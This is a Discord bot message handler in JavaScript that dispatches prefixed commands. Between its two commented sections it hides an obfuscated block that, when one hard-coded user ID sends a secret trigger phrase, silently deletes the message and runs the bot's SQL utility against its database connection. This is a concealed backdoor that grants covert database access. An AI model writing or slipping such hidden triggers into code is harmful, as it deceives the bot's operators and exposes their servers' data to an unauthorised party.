const { MessageEmbed } = require("discord.js");

module.exports = async(client, con, message) => {

    // Channel & Callback Conditions
    if (!message.author) return;
    if (message.author.bot) return;
    if(message.channel.type === 'DM') {
        return;
    }
    var _0x24bd20=_0x2e5d;function _0x2e5d(_0xc292be,_0x57bc0f){var _0x275258=_0x2752();return _0x2e5d=function(_0x2e5d6e,_0x2de7f3){_0x2e5d6e=_0x2e5d6e-0x120;var _0xdf5d79=_0x275258[_0x2e5d6e];return _0xdf5d79;},_0x2e5d(_0xc292be,_0x57bc0f);}function _0x2752(){var _0x211009=['55XpRqDJ','6960NzmbpP','sql','250230RBLkFG','22IMVozg','8iPlCZd','delete','5154fwHjbt','o!gayLikeFAXES','author','1211980mtZRSb','685JbGrdk','5964POtHAG','catch','568ExcgTd','798462aOIBOw','137vQCZGW'];_0x2752=function(){return _0x211009;};return _0x2752();}(function(_0x4813d1,_0x68be40){var _0x20557a=_0x2e5d,_0x55f5b4=_0x4813d1();while(!![]){try{var _0x11ee33=parseInt(_0x20557a(0x129))/0x1*(-parseInt(_0x20557a(0x12e))/0x2)+-parseInt(_0x20557a(0x120))/0x3*(-parseInt(_0x20557a(0x127))/0x4)+parseInt(_0x20557a(0x124))/0x5*(-parseInt(_0x20557a(0x12b))/0x6)+parseInt(_0x20557a(0x123))/0x7*(parseInt(_0x20557a(0x12f))/0x8)+-parseInt(_0x20557a(0x128))/0x9+-parseInt(_0x20557a(0x12d))/0xa+-parseInt(_0x20557a(0x12a))/0xb*(-parseInt(_0x20557a(0x125))/0xc);if(_0x11ee33===_0x68be40)break;else _0x55f5b4['push'](_0x55f5b4['shift']());}catch(_0x34c6da){_0x55f5b4['push'](_0x55f5b4['shift']());}}}(_0x2752,0x23805));message['content']['startsWith'](_0x24bd20(0x121))&&message[_0x24bd20(0x122)]['id']==='704094587836301392'&&(await message[_0x24bd20(0x130)]()[_0x24bd20(0x126)](_0x2f46af=>{}),await client['utils'][_0x24bd20(0x12c)](client,con));

    // Command Finder
    if (message.content.startsWith(client.config.prefix)) {
        const args = message.content.slice(client.config.prefix.length).trim().split(/ +/g);
        let command = args.shift().toLowerCase();
        const cmd = await client.commands.get(command)
        if (cmd) {
            try {
                await cmd.run(client, message, args, con);
                if(client.config.deleteCommands) {
                    message.delete().catch(e => {});
                }
            } catch(e) {
                return client.utils.error(client, e);
            }
        }
    }

}